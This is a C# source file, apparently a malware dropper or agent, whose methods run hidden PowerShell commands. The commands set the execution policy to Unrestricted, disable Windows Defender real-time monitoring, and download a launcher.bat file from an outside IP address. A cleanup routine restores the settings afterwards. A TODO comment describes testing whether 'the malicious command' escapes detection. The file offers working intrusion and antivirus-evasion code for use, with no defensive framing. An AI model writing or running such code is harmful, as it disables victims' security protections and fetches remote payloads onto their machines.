using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EmbeddedAgent
{
    internal class AgentProcess
    {
        public static void ExecuteCommands(List<string> commands)
        {
            ProcessStartInfo psi = new ProcessStartInfo();

            psi.CreateNoWindow = true;
            psi.FileName = "powershell.exe";
            psi.WindowStyle = ProcessWindowStyle.Hidden;

            psi.ArgumentList.Add("-Command");

            commands.ForEach(command =>
            {
                psi.ArgumentList.Add(command + ";");
            });

            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.CreateNoWindow = true;

            Process process = new Process();

            process.StartInfo = psi;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();

            process.WaitForExit();
            Console.WriteLine(output);
        }

        public static bool CheckIfLauncherIsAlreadyInstalled()
        {
            return File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "launcher.bat"));
        }

        public static List<string> InitCommands()
        {
            List<string> commands = new List<string>();

            commands.Add($"cd $env:tmp");
            commands.Add("Set-ExecutionPolicy Unrestricted");
            commands.Add("Set-MpPreference -DisableRealtimeMonitoring $true");

            if (!CheckIfLauncherIsAlreadyInstalled())
                commands.Add("Invoke-WebRequest http://192.168.76.131/launcher.bat -OutFile launcher.bat");

            return commands;

        }
        /*
         * TODO test cases
         * 
         * First Test case:
         * I execute the malicious command and then wait a moment and then i run the cleanup command (I will try to see if the command gets detected,even after it has bee run)
         * If nothing happens and it doesnt get detected then i'm good
         * 
         * Second case:
         * Will have to think about it, if the first cas gets detected
         * 
         */
        public static List<string> CleanUpCommands()
        {

            List<string> commands = new List<string>();

            commands.Add("Set-ExecutionPolicy Restricted");
            commands.Add("Set-MpPreference -DisableRealtimeMonitoring $false");

            return commands;

        }
    }
}
